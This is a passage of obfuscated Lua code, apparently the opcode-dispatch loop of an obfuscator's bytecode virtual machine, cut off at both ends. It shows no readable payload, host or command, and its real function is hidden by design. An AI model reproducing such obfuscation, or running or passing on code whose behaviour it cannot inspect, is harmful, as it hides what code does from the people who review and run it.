;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=264) then if (Enum<=259) then if (Enum<=256) then if (Enum>255) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=257) then local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end elseif (Enum==258) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=261) then if (Enum==260) then if (Inst[2]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=262) then local A;Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));elseif (Enum>263) then local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=269) then if (Enum<=266) then if (Enum==265) then local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=267) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum==268) then Stk[Inst[2]]=Stk[Inst[3]]%Inst[4] ;else Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];end elseif (Enum<=271) then if (Enum>270) then local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=272) then local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];elseif (Enum==273) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]=Inst[3] -Stk[Inst[4]] ;end elseif (Enum<=294) then if (Enum<=284) then if (Enum<=279) then if (Enum<=276) then if (Enum>275) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=277) then Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];elseif (Enum>278) then local Edx;local Results,Limit;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=281) then if (Enum>280) then Stk[Inst[2]]=Inst[3];else local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=282) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>283) then Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];else Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];end elseif (Enum<=289) then if (Enum<=286) then if (Enum>285) then local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local K;local B;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 